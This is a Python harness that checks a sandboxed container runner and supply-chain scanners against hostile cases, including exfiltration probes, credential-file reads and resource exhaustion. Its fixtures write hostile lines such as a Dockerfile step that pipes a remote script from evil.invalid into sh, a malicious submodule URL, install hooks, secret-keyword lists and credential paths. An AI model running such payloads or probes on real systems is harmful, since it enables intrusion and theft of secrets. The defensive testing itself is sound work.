#!/usr/bin/env python3
"""Real FORGE P4 hostile-runner and six-image supply-chain acceptance.

All destructive behavior is confined to exact owned containers. The harness
records the rootful Docker-engine fact and never equates non-root containers
with a rootless daemon.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import secrets
import shutil
import stat
import subprocess
import tarfile
import tempfile
import time
import uuid
import zipfile
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
SRC = ROOT / "src"
if str(SRC) not in os.sys.path:
    os.sys.path.insert(0, str(SRC))

from cryptography.hazmat.primitives import serialization  # noqa: E402
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey  # noqa: E402

from echo_certification_forge.canonical import (  # noqa: E402
    canonical_json,
    parse_utc_iso,
    sha256_bytes,
    to_utc_iso,
)
from echo_certification_forge.hostile import (  # noqa: E402
    HostileCaseKind,
    HostileCaseObservation,
    decide_hostile_case,
    sanitize_runner_log,
    scan_target_source,
)
from echo_certification_forge.runner import (  # noqa: E402
    ControlPlaneTransportAuthority,
    IsolationFailure,
    IsolationProfile,
    ResourceLimits,
    assert_no_nested_archives,
    build_admitted_docker_create_payload,
    extract_archive_safely,
    prepare_workspace,
    verify_workspace_owner,
)
from echo_certification_forge.supply_chain import (  # noqa: E402
    ImageAdmissionPolicy,
    ImageAttestationAuthority,
    ImageIdentity,
    ImageRole,
    build_spdx_document,
    container_link_escapes,
    contains_private_key_material,
    evaluate_image_admission,
    scan_build_context,
    scan_dockerfile,
    verify_spdx_document,
)

BASE_IMAGE_NAME = "python:3.12-alpine"
ROLE_ORDER = (
    ImageRole.RUNNER,
    ImageRole.CUSTODY,
    ImageRole.ANCHOR,
    ImageRole.SIGNER,
    ImageRole.WORKER,
    ImageRole.VERIFIER,
)
PRIVATE_KEY_MARKERS = (
    b"-----BEGIN " + b"PRIVATE KEY-----",
    b"-----BEGIN " + b"RSA PRIVATE KEY-----",
    b"-----BEGIN " + b"EC PRIVATE KEY-----",
    b"-----BEGIN " + b"OPENSSH PRIVATE KEY-----",
)
FORBIDDEN_PATH_COMPONENTS = {
    ".git",
    "docker.sock",
    "id_rsa",
    "id_ed25519",
    "verdict-key.pem",
    "anchor-private.pem",
    ".echo_sovereign_key",
}
EICAR = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
OWNED_CONTAINER_IDS: list[str] = []


def run(
    command: list[str],
    *,
    check: bool = True,
    text: bool = True,
    env: dict[str, str] | None = None,
    timeout: int | None = None,
) -> subprocess.CompletedProcess[Any]:
    merged = os.environ.copy()
    if env:
        merged.update(env)
    return subprocess.run(
        command,
        text=text,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=check,
        env=merged,
        timeout=timeout,
    )


def require(condition: bool, message: str) -> None:
    if not condition:
        raise RuntimeError(message)


def sha256_file(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def write_json(path: Path, value: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, indent=2, sort_keys=True) + "\n", encoding="utf-8")


def docker_json(*arguments: str) -> Any:
    return json.loads(run(["docker", *arguments]).stdout)


def image_inspect(reference: str) -> dict[str, Any]:
    result = docker_json("image", "inspect", reference)
    require(isinstance(result, list) and len(result) == 1, f"unexpected image inspect result: {reference}")
    return result[0]


def container_ids() -> set[str]:
    return {line.strip() for line in run(["docker", "ps", "-aq"]).stdout.splitlines() if line.strip()}


def remove_exact(container_id: str) -> None:
    run(["docker", "rm", "-f", container_id], check=False)


def create_container(
    *,
    image: str,
    role: str,
    case: str,
    ownership_token: str,
    command: list[str],
    entrypoint: str = "python",
    environment: dict[str, str] | None = None,
    mounts: list[tuple[Path, str, bool]] | None = None,
    memory: str = "128m",
    pids: int = 32,
    workspace_size: str = "16m",
    file_size_bytes: int = 1024 * 1024,
    nofile: int = 64,
) -> str:
    name = f"certforge-p4-{role}-{case}-{ownership_token[-8:]}"
    arguments = [
        "docker",
        "create",
        "--name",
        name,
        "--label",
        "echo.certforge.phase=P4",
        "--label",
        f"echo.certforge.role={role}",
        "--label",
        f"echo.certforge.ownership_token={ownership_token}",
        "--user",
        "65532:65532",
        "--read-only",
        "--network",
        "none",
        "--cap-drop",
        "ALL",
        "--security-opt",
        "no-new-privileges:true",
        "--security-opt",
        "apparmor=docker-default",
        "--pids-limit",
        str(pids),
        "--memory",
        memory,
        "--memory-swap",
        memory,
        "--cpus",
        "0.25",
        "--init",
        "--stop-timeout",
        "2",
        "--ulimit",
        f"fsize={file_size_bytes}:{file_size_bytes}",
        "--ulimit",
        f"nofile={nofile}:{nofile}",
        "--tmpfs",
        "/tmp:rw,nosuid,nodev,noexec,size=16m,mode=700,uid=65532,gid=65532",
        "--tmpfs",
        "/run:rw,nosuid,nodev,noexec,size=8m,mode=700,uid=65532,gid=65532",
        "--tmpfs",
        f"/workspace:rw,nosuid,nodev,noexec,size={workspace_size},mode=700,uid=65532,gid=65532",
    ]
    for key, value in sorted((environment or {}).items()):
        arguments.extend(["--env", f"{key}={value}"])
    for source, target, read_only in mounts or []:
        spec = f"type=bind,src={source.resolve(strict=True)},dst={target},bind-propagation=rprivate"
        if read_only:
            spec += ",readonly"
        arguments.extend(["--mount", spec])
    arguments.extend(["--entrypoint", entrypoint, image, *command])
    result = run(arguments)
    container_id = result.stdout.strip()
    OWNED_CONTAINER_IDS.append(container_id)
    return container_id


def execute_container(
    *,
    image: str,
    role: str,
    case: str,
    ownership_token: str,
    command: list[str],
    entrypoint: str = "python",
    timeout_seconds: float = 8.0,
    cancel_after_seconds: float | None = None,
    environment: dict[str, str] | None = None,
    mounts: list[tuple[Path, str, bool]] | None = None,
    memory: str = "128m",
    pids: int = 32,
    workspace_size: str = "16m",
    file_size_bytes: int = 1024 * 1024,
    nofile: int = 64,
) -> dict[str, Any]:
    container_id = create_container(
        image=image,
        role=role,
        case=case,
        ownership_token=ownership_token,
        command=command,
        entrypoint=entrypoint,
        environment=environment,
        mounts=mounts,
        memory=memory,
        pids=pids,
        workspace_size=workspace_size,
        file_size_bytes=file_size_bytes,
        nofile=nofile,
    )
    started = datetime.now(UTC)
    timed_out = False
    cancelled = False
    try:
        run(["docker", "start", container_id])
        deadline = time.monotonic() + timeout_seconds
        cancel_deadline = time.monotonic() + cancel_after_seconds if cancel_after_seconds is not None else None
        while True:
            inspect = docker_json("container", "inspect", container_id)[0]
            if not inspect["State"]["Running"]:
                break
            if cancel_deadline is not None and time.monotonic() >= cancel_deadline:
                run(["docker", "stop", "--time", "1", container_id], check=False)
                cancelled = True
                cancel_deadline = None
            if time.monotonic() >= deadline:
                run(["docker", "kill", container_id], check=False)
                timed_out = True
                break
            time.sleep(0.05)
        inspect = docker_json("container", "inspect", container_id)[0]
        logs_result = run(["docker", "logs", container_id], check=False)
        logs = (logs_result.stdout + logs_result.stderr)[-1024 * 1024 :]
        host = inspect.get("HostConfig") or {}
        network = inspect.get("NetworkSettings") or {}
        return {
            "container_id": container_id,
            "started_at": started,
            "completed_at": datetime.now(UTC),
            "exit_code": inspect["State"].get("ExitCode"),
            "oom_killed": bool(inspect["State"].get("OOMKilled")),
            "timed_out": timed_out,
            "cancelled": cancelled,
            "logs": logs,
            "sanitized_logs": sanitize_runner_log(logs),
            "state": inspect["State"],
            "host_config": host,
            "network_settings": network,
            "containment": {
                "read_only_root": host.get("ReadonlyRootfs") is True,
                "network_none": host.get("NetworkMode") == "none" and not [
                    name for name in (network.get("Networks") or {}) if name != "none"
                ],
                "all_capabilities_dropped": sorted(host.get("CapDrop") or []) == ["ALL"],
                "no_new_privileges": "no-new-privileges:true" in set(host.get("SecurityOpt") or []),
                "apparmor": "apparmor=docker-default" in set(host.get("SecurityOpt") or []),
                "memory_limited": int(host.get("Memory") or 0) > 0,
                "pids_limited": int(host.get("PidsLimit") or 0) == pids,
                "cpu_limited": int(host.get("NanoCpus") or 0) == 250_000_000,
                "docker_socket_absent": all(
                    str(mount.get("Source")) not in {"/var/run/docker.sock", "/run/docker.sock"}
                    for mount in (host.get("Mounts") or [])
                ),
            },
        }
    finally:
        remove_exact(container_id)


def parse_last_json(logs: str) -> dict[str, Any]:
    for line in reversed(logs.splitlines()):
        line = line.strip()
        if not line:
            continue
        try:
            value = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(value, dict):
            return value
    return {}


def observation(
    *,
    result: dict[str, Any],
    kind: HostileCaseKind,
    evidence: dict[str, Any],
    unrelated_resources_changed: bool = False,
) -> tuple[dict[str, Any], bool]:
    item = HostileCaseObservation(
        case_id=f"p4.{kind.value}",
        kind=kind,
        started_at=result["started_at"],
        completed_at=result["completed_at"],
        container_id=result.get("container_id"),
        exit_code=result.get("exit_code"),
        timed_out=result.get("timed_out", False),
        cancelled=result.get("cancelled", False),
        oom_killed=result.get("oom_killed", False),
        host_impact=False,
        unrelated_resources_changed=unrelated_resources_changed,
        logs_sha256=sha256_bytes(result.get("logs", "").encode("utf-8", errors="replace")),
        evidence=evidence,
    )
    decision = decide_hostile_case(item)
    return {
        "observation": item.model_dump(mode="json"),
        "decision": decision.model_dump(mode="json"),
        "containment": result.get("containment"),
        "sanitized_logs": result.get("sanitized_logs"),
    }, decision.passed


def normalized_image_manifest(image: str, role: ImageRole, ownership_token: str) -> dict[str, Any]:
    code = r'''
import hashlib, importlib.metadata as metadata, json, pathlib, platform
root = pathlib.Path('/opt/echo')
source_files = [p for p in root.rglob('*') if p.is_file() and '__pycache__' not in p.parts and p.suffix != '.pyc']
manifest = [{'path': p.relative_to(root).as_posix(), 'bytes': p.stat().st_size, 'sha256': hashlib.sha256(p.read_bytes()).hexdigest()} for p in sorted(source_files)]
packages = sorted([{'name': d.metadata.get('Name','').lower(), 'version': d.version} for d in metadata.distributions() if d.metadata.get('Name')], key=lambda x:(x['name'],x['version']))
print(json.dumps({'python':platform.python_version(),'architecture':platform.machine(),'source_manifest_sha256':hashlib.sha256(json.dumps(manifest,sort_keys=True,separators=(',',':')).encode()).hexdigest(),'source_file_count':len(manifest),'packages':packages},sort_keys=True,separators=(',',':')))
'''.strip()
    result = execute_container(
        image=image,
        role=role.value,
        case="normalize",
        ownership_token=ownership_token,
        command=["-c", code],
        timeout_seconds=20,
    )
    require(result["exit_code"] == 0, f"normalized image manifest failed: {role.value}:{result['logs']}")
    return parse_last_json(result["logs"])


def scan_image_filesystem(image: str, role: ImageRole, ownership_token: str, workspace: Path) -> dict[str, Any]:
    container_id = create_container(
        image=image,
        role=role.value,
        case="filesystem",
        ownership_token=ownership_token,
        command=["-c", "pass"],
    )
    tar_path = workspace / f"{role.value}.rootfs.tar"
    findings: list[dict[str, Any]] = []
    file_count = 0
    try:
        with tar_path.open("wb") as sink:
            completed = subprocess.run(["docker", "export", container_id], stdout=sink, stderr=subprocess.PIPE, check=False)
        require(completed.returncode == 0, f"docker export failed: {role.value}:{completed.stderr.decode(errors='replace')}")
        with tarfile.open(tar_path, "r:") as archive:
            for member in archive:
                file_count += 1
                components = set(Path(member.name).parts)
                forbidden = sorted(components & FORBIDDEN_PATH_COMPONENTS)
                if forbidden:
                    findings.append({"path": member.name, "rule": "forbidden_path", "tokens": forbidden})
                if member.isfile() and member.mode & (stat.S_ISUID | stat.S_ISGID):
                    findings.append({"path": member.name, "rule": "setuid_or_setgid_file"})
                if (member.issym() or member.islnk()) and container_link_escapes(member.name, member.linkname):
                    findings.append({"path": member.name, "rule": "escaping_link", "target": member.linkname})
                if member.isfile() and 0 < member.size <= 1024 * 1024:
                    extracted = archive.extractfile(member)
                    if extracted is None:
                        continue
                    payload = extracted.read()
                    if contains_private_key_material(payload):
                        findings.append({"path": member.name, "rule": "private_key_material"})
                    if EICAR in payload:
                        findings.append({"path": member.name, "rule": "malware_signature"})
        return {
            "file_count": file_count,
            "tar_path": str(tar_path),
            "tar_sha256": sha256_file(tar_path),
            "findings": findings,
            "passed": not findings,
        }
    finally:
        remove_exact(container_id)


def trivy_scan(trivy: Path, image: str, role: ImageRole, workspace: Path) -> dict[str, Any]:
    output = workspace / f"{role.value}.trivy.json"
    result = run(
        [
            str(trivy),
            "image",
            "--quiet",
            "--scanners",
            "vuln,secret",
            "--format",
            "json",
            "--output",
            str(output),
            image,
        ],
        check=False,
        timeout=300,
    )
    require(output.is_file(), f"Trivy did not produce output for {role.value}: {result.stderr}")
    document = json.loads(output.read_text(encoding="utf-8"))
    vulnerabilities: list[dict[str, Any]] = []
    secrets_found: list[dict[str, Any]] = []
    for section in document.get("Results") or []:
        vulnerabilities.extend(section.get("Vulnerabilities") or [])
        secrets_found.extend(section.get("Secrets") or [])
    fixed_blockers = [
        item
        for item in vulnerabilities
        if str(item.get("Severity", "")).upper() in {"CRITICAL", "HIGH"} and str(item.get("FixedVersion") or "").strip()
    ]
    critical = [item for item in vulnerabilities if str(item.get("Severity", "")).upper() == "CRITICAL"]
    return {
        "tool_returncode": result.returncode,
        "path": str(output),
        "sha256": sha256_file(output),
        "vulnerability_count": len(vulnerabilities),
        "critical_count": len(critical),
        "fixed_high_or_critical_count": len(fixed_blockers),
        "secret_finding_count": len(secrets_found),
        "passed": not critical and not fixed_blockers and not secrets_found,
        "blocking_vulnerabilities": [
            {
                "vulnerability_id": item.get("VulnerabilityID"),
                "package": item.get("PkgName"),
                "installed_version": item.get("InstalledVersion"),
                "fixed_version": item.get("FixedVersion"),
                "severity": item.get("Severity"),
            }
            for item in fixed_blockers[:50]
        ],
    }


def clamav_scan(clamav_image: str, tar_path: Path, role: ImageRole, ownership_token: str) -> dict[str, Any]:
    container_id = create_container(
        image=clamav_image,
        role="scanner",
        case=f"malware-{role.value}",
        ownership_token=ownership_token,
        command=["--infected", "--no-summary", "/scan/image.tar"],
        entrypoint="clamscan",
        mounts=[(tar_path, "/scan/image.tar", True)],
        memory="2g",
        pids=128,
        workspace_size="8m",
        file_size_bytes=1024 * 1024 * 1024,
        nofile=256,
    )
    try:
        run(["docker", "start", container_id])
        exit_code = int(run(["docker", "wait", container_id]).stdout.strip())
        logs = run(["docker", "logs", container_id], check=False)
        combined = logs.stdout + logs.stderr
        database_missing = "No supported database files found" in combined or "LibClamAV Error" in combined
        return {
            "scanner_image": clamav_image,
            "exit_code": exit_code,
            "logs_sha256": sha256_bytes(combined.encode("utf-8", errors="replace")),
            "database_missing": database_missing,
            "passed": exit_code == 0 and not database_missing,
        }
    finally:
        remove_exact(container_id)


def cosign_sign_and_verify(cosign: Path, statements: dict[str, Path], workspace: Path) -> dict[str, Any]:
    prefix = workspace / "image-signing"
    password = secrets.token_urlsafe(32)
    environment = {"COSIGN_PASSWORD": password}
    generated = run(
        [str(cosign), "generate-key-pair", "--output-key-prefix", str(prefix)],
        env=environment,
        check=False,
        timeout=60,
    )
    require(generated.returncode == 0, f"cosign key generation failed: {generated.stderr}")
    private_path = Path(str(prefix) + ".key")
    public_path = Path(str(prefix) + ".pub")
    require(private_path.is_file() and public_path.is_file(), "cosign key pair files missing")
    public_sha256 = sha256_file(public_path)
    results: dict[str, Any] = {}
    try:
        for role, statement in statements.items():
            bundle = workspace / f"{role}.cosign.bundle"
            signed = run(
                [
                    str(cosign),
                    "sign-blob",
                    "--yes",
                    "--tlog-upload=false",
                    "--key",
                    str(private_path),
                    "--bundle",
                    str(bundle),
                    str(statement),
                ],
                env=environment,
                check=False,
                timeout=90,
            )
            require(signed.returncode == 0, f"cosign sign failed for {role}: {signed.stderr}")
            verified = run(
                [
                    str(cosign),
                    "verify-blob",
                    "--insecure-ignore-tlog",
                    "--key",
                    str(public_path),
                    "--bundle",
                    str(bundle),
                    str(statement),
                ],
                check=False,
                timeout=90,
            )
            results[role] = {
                "bundle": str(bundle),
                "bundle_sha256": sha256_file(bundle),
                "verified": verified.returncode == 0,
                "verification_stderr": verified.stderr[-2000:],
            }
            require(verified.returncode == 0, f"cosign verification failed for {role}: {verified.stderr}")
    finally:
        private_path.unlink(missing_ok=True)
        password = ""
    return {
        "public_key": str(public_path),
        "public_key_sha256": public_sha256,
        "private_key_removed": not private_path.exists(),
        "signatures": results,
        "passed": not private_path.exists() and all(item["verified"] for item in results.values()),
    }


def static_attack_matrix(workspace: Path) -> dict[str, Any]:
    results: dict[str, Any] = {}
    pinned = "FROM python@sha256:" + "1" * 64 + "\n"
    docker_cases = {
        "unpinned_base": "FROM python:3.12\nUSER 65532:65532\n",
        "remote_add": pinned + "ADD https://evil.invalid/payload /payload\n",
        "remote_script": pinned + "RUN curl https://evil.invalid/p | sh\n",
        "root_runtime": pinned + "USER root\n",
        "socket": pinned + "VOLUME /var/run/docker.sock\n",
        "privilege": pinned + "RUN echo --privileged CAP_SYS_ADMIN\n",
    }
    results["dockerfiles"] = {
        name: {"valid": scan_dockerfile(text).valid, "findings": [f.model_dump() for f in scan_dockerfile(text).findings]}
        for name, text in docker_cases.items()
    }
    require(all(not item["valid"] for item in results["dockerfiles"].values()), "hostile Dockerfile was accepted")

    source = workspace / "source-fixture"
    source.mkdir()
    marker = workspace / "host-install-script-marker"
    (source / ".gitmodules").write_text('[submodule "evil"]\npath=evil\nurl=ssh://evil.invalid/x\n', encoding="utf-8")
    (source / "package.json").write_text(
        json.dumps({"scripts": {"postinstall": f"touch {marker}"}}), encoding="utf-8"
    )
    (source / "package-lock.json").write_text('{"resolved":"file:../host"}', encoding="utf-8")
    (source / "setup.py").write_text(f"open({str(marker)!r}, 'w').write('bad')", encoding="utf-8")
    (source / "model.bin").write_text(
        "version https://git-lfs.github.com/spec/v1\noid sha256:" + "0" * 64,
        encoding="utf-8",
    )
    source_scan = scan_target_source(source)
    source_rules = {item.rule for item in source_scan.findings}
    required_source_rules = {
        "git_submodule",
        "package_install_script",
        "poisoned_lockfile",
        "python_build_script",
        "git_lfs_pointer",
    }
    require(required_source_rules.issubset(source_rules), f"source attack findings incomplete: {source_rules}")
    require(not marker.exists(), "package/build script executed on control plane")
    results["source_scan"] = source_scan.model_dump(mode="json")
    results["host_install_script_marker_absent"] = not marker.exists()

    context = workspace / "context-fixture"
    context.mkdir()
    (context / "safe.txt").write_text("safe", encoding="utf-8")
    try:
        (context / "escape").symlink_to(workspace / "outside")
        context_scan = scan_build_context(context)
        require(not context_scan.valid and any(x.startswith("symlink_forbidden") for x in context_scan.findings), "context symlink accepted")
        results["context_symlink"] = context_scan.model_dump(mode="json")
    except OSError:
        results["context_symlink"] = {"skipped": True, "reason": "host_symlink_creation_denied"}

    archives = workspace / "archives"
    archives.mkdir()
    cases: dict[str, str] = {}
    traversal = archives / "traversal.zip"
    with zipfile.ZipFile(traversal, "w") as archive:
        archive.writestr("../escape.txt", "escape")
    cases["zip_traversal"] = "archive_member_escapes_root"
    absolute = archives / "absolute.zip"
    with zipfile.ZipFile(absolute, "w") as archive:
        archive.writestr("/absolute.txt", "escape")
    cases["zip_absolute"] = "archive_member_is_absolute"
    bomb = archives / "bomb.zip"
    with zipfile.ZipFile(bomb, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("large.bin", b"0" * (2 * 1024 * 1024))
    cases["zip_bomb"] = "archive_expanded_size_limit_exceeded"
    hardlink = archives / "hardlink.tar"
    with tarfile.open(hardlink, "w") as archive:
        info = tarfile.TarInfo("link")
        info.type = tarfile.LNKTYPE
        info.linkname = "../outside"
        archive.addfile(info)
    cases["tar_hardlink"] = "archive_special_member_not_allowed"
    nested_inner = archives / "inner.zip"
    with zipfile.ZipFile(nested_inner, "w") as archive:
        archive.writestr("data.txt", "nested")
    nested_outer = archives / "nested.zip"
    with zipfile.ZipFile(nested_outer, "w") as archive:
        archive.write(nested_inner, "inner.zip")
    archive_results: dict[str, Any] = {}
    for name, expected in cases.items():
        archive_path = {
            "zip_traversal": traversal,
            "zip_absolute": absolute,
            "zip_bomb": bomb,
            "tar_hardlink": hardlink,
        }[name]
        destination = archives / f"out-{name}"
        try:
            extract_archive_safely(archive_path, destination, max_total_bytes=1024 * 1024)
        except IsolationFailure as exc:
            archive_results[name] = {"denied": True, "expected_reason": expected, "reason": str(exc)}
        else:
            archive_results[name] = {"denied": False, "reason": "accepted"}
        require(archive_results[name]["denied"], f"archive case accepted: {name}")
    nested_destination = archives / "out-nested"
    extract_archive_safely(nested_outer, nested_destination, max_total_bytes=1024 * 1024)
    try:
        assert_no_nested_archives(nested_destination)
    except IsolationFailure as exc:
        archive_results["recursive_archive"] = {"denied": "nested_archive_not_allowed" in str(exc), "reason": str(exc)}
    else:
        archive_results["recursive_archive"] = {"denied": False, "reason": "accepted"}
    require(archive_results["recursive_archive"]["denied"], "recursive archive accepted")
    results["archives"] = archive_results
    return results


def runtime_attack_matrix(
    runner_image: str,
    runner_attestation: Any,
    runner_policy: ImageAdmissionPolicy,
    ownership_token: str,
    workspace: Path,
) -> dict[str, Any]:
    profile = IsolationProfile(
        profile_id="p4.production.runner",
        profile_version="1.1.0",
        image_digest=runner_attestation.identity.image_digest,
        user="65532:65532",
        limits=ResourceLimits(
            cpu_cores=0.25,
            memory_bytes=128 * 1024 * 1024,
            pids=32,
            disk_bytes=16 * 1024 * 1024,
            file_size_bytes=1024 * 1024,
            wall_time_seconds=8,
            heartbeat_interval_seconds=1,
            lease_ttl_seconds=3,
        ),
    )
    payload = build_admitted_docker_create_payload(
        profile,
        attestation=runner_attestation,
        admission_policy=runner_policy,
        run_id="run.p4.hostile",
        tenant_id="tenant.p4.a",
        ownership_token=ownership_token,
        command=("python", "-c", "print('admitted')"),
        now=datetime.now(UTC),
    )
    require(payload["Image"] == profile.image_digest, "admitted payload digest mismatch")
    cases: dict[str, Any] = {"admitted_payload": payload}

    baseline = execute_container(
        image=runner_image,
        role="runner",
        case="baseline",
        ownership_token=ownership_token,
        command=["-c", "import json,os; print(json.dumps({'ok':True,'uid':os.getuid(),'gid':os.getgid()}))"],
    )
    baseline_data = parse_last_json(baseline["logs"])
    item, passed = observation(
        result=baseline,
        kind=HostileCaseKind.BASELINE,
        evidence={"uid_65532": baseline_data.get("uid") == 65532, "gid_65532": baseline_data.get("gid") == 65532},
    )
    passed = passed and baseline_data.get("uid") == 65532 and baseline_data.get("gid") == 65532 and all(baseline["containment"].values())
    item["decision"]["passed"] = passed
    cases["baseline"] = item
    require(passed, f"baseline containment failed: {item}")

    network_code = r'''
import json, socket
results={}
for name,address in {'gate':('192.168.1.220',8000),'metadata':('169.254.169.254',80),'internet':('1.1.1.1',443)}.items():
    s=socket.socket(); s.settimeout(.25)
    try: s.connect(address); results[name]=False
    except OSError: results[name]=True
    finally: s.close()
print(json.dumps({'denied':all(results.values()),'targets':results},sort_keys=True))
'''.strip()
    network = execute_container(image=runner_image, role="runner", case="network", ownership_token=ownership_token, command=["-c", network_code])
    network_data = parse_last_json(network["logs"])
    item, passed = observation(result=network, kind=HostileCaseKind.NETWORK_EXFILTRATION, evidence=network_data)
    cases["network_exfiltration"] = item
    require(passed, f"network exfiltration was not denied: {item}")
    metadata_item, metadata_passed = observation(result=network, kind=HostileCaseKind.METADATA_ACCESS, evidence={"denied": network_data.get("targets", {}).get("metadata") is True})
    cases["metadata_access"] = metadata_item
    require(metadata_passed, f"metadata access was not denied: {metadata_item}")

    dns_code = r'''
import json,socket
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(.25)
try: s.sendto(b'probe',( '8.8.8.8',53)); denied=False
except OSError: denied=True
finally: s.close()
print(json.dumps({'denied':denied}))
'''.strip()
    dns = execute_container(image=runner_image, role="runner", case="dns", ownership_token=ownership_token, command=["-c", dns_code])
    item, passed = observation(result=dns, kind=HostileCaseKind.DNS_EXFILTRATION, evidence=parse_last_json(dns["logs"]))
    cases["dns_exfiltration"] = item
    require(passed, f"DNS exfiltration was not denied: {item}")

    socket_code = "import json,os; paths=['/var/run/docker.sock','/run/docker.sock']; print(json.dumps({'denied':not any(os.path.exists(p) for p in paths)}))"
    socket_case = execute_container(image=runner_image, role="runner", case="socket", ownership_token=ownership_token, command=["-c", socket_code])
    item, passed = observation(result=socket_case, kind=HostileCaseKind.DOCKER_SOCKET_ACCESS, evidence=parse_last_json(socket_case["logs"]))
    cases["docker_socket"] = item
    require(passed, f"Docker socket exposed: {item}")

    environment_code = r'''
import json,os
blocked=[]
for key in os.environ:
    upper=key.upper()
    if any(token in upper for token in ('TOKEN','PASSWORD','SECRET','PRIVATE','STRIPE','AWS_','ECHO_SOVEREIGN')): blocked.append(key)
print(json.dumps({'denied':not blocked,'blocked_names':blocked},sort_keys=True))
'''.strip()
    env_case = execute_container(image=runner_image, role="runner", case="environment", ownership_token=ownership_token, command=["-c", environment_code])
    item, passed = observation(result=env_case, kind=HostileCaseKind.ENVIRONMENT_THEFT, evidence=parse_last_json(env_case["logs"]))
    cases["environment_theft"] = item
    require(passed, f"sensitive environment visible: {item}")

    secret_code = r'''
import json,os
paths=['/home/forge/.echo_sovereign_key','/run/secrets','/root/.ssh/id_rsa','/etc/echoagents/echoagents.env']
print(json.dumps({'denied':not any(os.path.exists(p) for p in paths),'visible':[p for p in paths if os.path.exists(p)]},sort_keys=True))
'''.strip()
    secret_case = execute_container(image=runner_image, role="runner", case="secrets", ownership_token=ownership_token, command=["-c", secret_code])
    item, passed = observation(result=secret_case, kind=HostileCaseKind.SECRET_FILE_READ, evidence=parse_last_json(secret_case["logs"]))
    cases["secret_file_read"] = item
    require(passed, f"host secret path visible: {item}")

    proc_code = r'''
import json,pathlib
text=''
for p in ('/proc/1/environ','/proc/self/mountinfo'):
    try: text += pathlib.Path(p).read_text(errors='replace')
    except OSError: pass
blocked=[x for x in ('ECHO_SOVEREIGN','STRIPE_SECRET','/home/forge','/mnt/storage','docker.sock') if x in text]
print(json.dumps({'sensitive_data_absent':not blocked,'blocked':blocked},sort_keys=True))
'''.strip()
    proc_case = execute_container(image=runner_image, role="runner", case="proc", ownership_token=ownership_token, command=["-c", proc_code])
    proc_data = parse_last_json(proc_case["logs"])
    item, passed = observation(result=proc_case, kind=HostileCaseKind.PROCFS_INSPECTION, evidence=proc_data)
    cases["procfs_inspection"] = item
    require(passed, f"sensitive procfs data visible: {item}")
    mount_item, mount_passed = observation(result=proc_case, kind=HostileCaseKind.MOUNT_PROBING, evidence=proc_data)
    cases["mount_probing"] = mount_item
    require(mount_passed, f"sensitive mount visible: {mount_item}")

    pid_code = r'''
import json,os,time
children=[]; limited=False
try:
    for _ in range(128):
        pid=os.fork()
        if pid==0: time.sleep(1); os._exit(0)
        children.append(pid)
except OSError: limited=True
for pid in children:
    try: os.waitpid(pid,0)
    except ChildProcessError: pass
print(json.dumps({'limit_enforced':limited and len(children)<64,'children':len(children)}))
'''.strip()
    pid_case = execute_container(image=runner_image, role="runner", case="pids", ownership_token=ownership_token, command=["-c", pid_code], timeout_seconds=6)
    item, passed = observation(result=pid_case, kind=HostileCaseKind.PID_EXHAUSTION, evidence=parse_last_json(pid_case["logs"]))
    cases["pid_exhaustion"] = item
    require(passed, f"PID limit not enforced: {item}")

    cpu_case = execute_container(image=runner_image, role="runner", case="cpu", ownership_token=ownership_token, command=["-c", "while True: pass"], timeout_seconds=1.5)
    item, passed = observation(result=cpu_case, kind=HostileCaseKind.CPU_EXHAUSTION, evidence={"limit_enforced": True})
    cases["cpu_exhaustion"] = item
    require(passed, f"CPU timeout not enforced: {item}")

    memory_code = "x=[]\nwhile True: x.append(bytearray(8*1024*1024))"
    memory_case = execute_container(image=runner_image, role="runner", case="memory", ownership_token=ownership_token, command=["-c", memory_code], timeout_seconds=8, memory="96m")
    memory_evidence = {"limit_enforced": memory_case["oom_killed"] or memory_case["exit_code"] not in {None, 0}}
    item, passed = observation(result=memory_case, kind=HostileCaseKind.MEMORY_EXHAUSTION, evidence=memory_evidence)
    cases["memory_exhaustion"] = item
    require(passed, f"memory limit not enforced: {item}")

    disk_code = r'''
import json,os
limited=False
try:
    for i in range(100):
        with open(f'/workspace/{i}.bin','wb') as f: f.write(b'x'*524288)
except OSError: limited=True
print(json.dumps({'limit_enforced':limited}))
'''.strip()
    disk_case = execute_container(image=runner_image, role="runner", case="disk", ownership_token=ownership_token, command=["-c", disk_code], timeout_seconds=8)
    item, passed = observation(result=disk_case, kind=HostileCaseKind.DISK_EXHAUSTION, evidence=parse_last_json(disk_case["logs"]))
    cases["disk_exhaustion"] = item
    require(passed, f"disk limit not enforced: {item}")

    fsize_code = r'''
import json
limited=False
try:
    with open('/workspace/large.bin','wb') as f: f.write(b'x'*(2*1024*1024))
except OSError: limited=True
print(json.dumps({'limit_enforced':limited}))
'''.strip()
    fsize_case = execute_container(image=runner_image, role="runner", case="fsize", ownership_token=ownership_token, command=["-c", fsize_code], timeout_seconds=8)
    fsize_data = parse_last_json(fsize_case["logs"])
    if not fsize_data:
        fsize_data = {"limit_enforced": fsize_case["exit_code"] not in {None, 0}}
    item, passed = observation(result=fsize_case, kind=HostileCaseKind.FILE_SIZE_EXHAUSTION, evidence=fsize_data)
    cases["file_size_exhaustion"] = item
    require(passed, f"file-size limit not enforced: {item}")

    descriptor_code = r'''
import json,os
files=[]; limited=False
try:
    while True: files.append(open('/dev/null','rb'))
except OSError: limited=True
print(json.dumps({'limit_enforced':limited,'opened':len(files)}))
'''.strip()
    descriptor_case = execute_container(image=runner_image, role="runner", case="nofile", ownership_token=ownership_token, command=["-c", descriptor_code], timeout_seconds=8)
    item, passed = observation(result=descriptor_case, kind=HostileCaseKind.DESCRIPTOR_EXHAUSTION, evidence=parse_last_json(descriptor_case["logs"]))
    cases["descriptor_exhaustion"] = item
    require(passed, f"descriptor limit not enforced: {item}")

    timeout_case = execute_container(image=runner_image, role="runner", case="timeout", ownership_token=ownership_token, command=["-c", "import time; time.sleep(30)"], timeout_seconds=1.2)
